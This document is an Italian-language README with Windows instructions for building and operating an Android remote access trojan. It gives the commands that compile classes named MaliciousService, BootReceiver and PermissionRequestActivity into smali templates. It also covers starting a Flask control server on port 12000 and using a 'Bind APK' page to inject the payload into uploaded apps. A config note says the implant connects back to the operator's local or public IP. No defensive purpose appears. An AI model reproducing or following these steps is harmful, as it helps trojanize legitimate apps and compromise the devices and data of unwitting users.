# Istruzioni per Windows

## Prerequisiti

1. Java JDK installato
2. Android SDK installato
3. Python 3.x installato
4. Flask e altre dipendenze Python installate

## Compilazione del codice Java

Per compilare il codice Java su Windows, esegui i seguenti comandi (adatta i percorsi in base alla tua installazione):

```batch
javac -d C:\Users\keymi\Desktop\RAT\src_java\compiled_classes -cp "C:\Users\keymi\Desktop\RAT\android-14\android.jar;C:\Users\keymi\Desktop\RAT\libs\json-20250517.jar" C:\Users\keymi\Desktop\RAT\src_java\com\example\android\BootReceiver.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\LauncherActivity.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\MaliciousService.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\PermissionRequestActivity.java

cd C:\Users\keymi\Desktop\RAT\src_java\compiled_classes
jar -cvf compiled_rat_classes.jar -C . com\example\android
cd C:\Users\keymi\Desktop\RAT\

d8 --output C:\Users\keymi\Desktop\RAT\src_java\dex_output C:\Users\keymi\Desktop\RAT\src_java\compiled_classes\compiled_rat_classes.jar --lib "C:\Users\keymi\Desktop\RAT\android-14\android.jar" --lib "C:\Users\keymi\Desktop\RAT\libs\json-20250517.jar"

java -jar C:\Tools\baksmali.jar disassemble C:\Users\keymi\Desktop\RAT\src_java\dex_output\classes.dex -o C:\Users\keymi\Desktop\RAT\smali_templates
```

## Avvio del server Flask

Per avviare il server Flask su Windows:

```batch
cd C:\Users\keymi\Desktop\RAT
python app.py
```

## Binding di un'APK

1. Accedi all'interfaccia web all'indirizzo http://localhost:12000
2. Vai alla pagina "Bind APK"
3. Carica un'APK e compila i campi richiesti
4. Clicca su "Bind APK"

## Note importanti

1. **Percorsi con spazi**: Abbiamo migliorato la gestione dei percorsi con spazi in Windows, utilizzando le virgolette doppie nei comandi.

2. **Configurazione IP**: Il sistema ora utilizza un metodo più affidabile per rilevare l'IP locale. Inoltre, l'app Android tenterà prima di connettersi all'IP locale e, se non disponibile, passerà all'IP pubblico.

3. **Formato config.ini**: Il file config.ini ora utilizza il formato:
   ```ini
   [SERVER]
   LOCAL_IP=192.168.1.x
   PUBLIC_IP=tuo.ip.pubblico
   PORT=12000
   ```

4. **Risoluzione dei problemi**:
   - Se riscontri problemi con i percorsi, assicurati che non ci siano spazi o caratteri speciali nei nomi delle cartelle
   - Se l'app non si connette, verifica che le porte siano aperte nel firewall
   - Verifica che l'IP locale sia corretto e che il dispositivo Android sia sulla stessa rete WiFi

5. **Compilazione manuale**: Se preferisci compilare manualmente, puoi utilizzare i comandi forniti all'inizio di questo file.